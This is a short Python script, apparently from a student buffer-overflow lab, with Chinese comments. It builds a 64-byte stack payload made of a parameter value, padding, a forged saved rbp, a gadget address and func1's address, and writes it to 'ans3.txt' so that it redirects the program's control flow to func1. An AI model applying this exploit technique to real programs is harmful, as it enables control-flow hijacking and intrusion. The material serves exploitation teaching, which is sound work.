# ============ 栈地址（先用占位符，后面通过 GDB 确定）============
BUF_ADDR = 0x4141414141414141  # 占位符，需要替换！

# ============ 地址定义 ============
gadget_addr = 0x4012e6    # mov -0x8(%rbp),%rax; mov %rax,%rdi; ret
func1_addr = 0x401216     # func1 函数地址
param = 0x72              # 参数值（十进制 114）

# ============ 计算 fake_rbp ============
fake_rbp = BUF_ADDR + 8

# ============ 构造 Payload ============
payload = b""
payload += param.to_bytes(8, 'little')       # 偏移 0-7:   参数 0x72
payload += b"B" * 8                           # 偏移 8-15:  填充
payload += b"C" * 8                           # 偏移 16-23: 填充
payload += b"D" * 8                           # 偏移 24-31: 填充
payload += fake_rbp.to_bytes(8, 'little')    # 偏移 32-39: 伪造的 rbp
payload += gadget_addr.to_bytes(8, 'little') # 偏移 40-47: gadget 地址
payload += func1_addr.to_bytes(8, 'little')  # 偏移 48-55: func1 地址
payload += b"E" * 8                           # 偏移 56-63: 填充

# ============ 写入文件 ============
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload written to ans3.txt ({len(payload)} bytes)")
print(f"BUF_ADDR = {hex(BUF_ADDR)}")
print(f"fake_rbp = {hex(fake_rbp)}")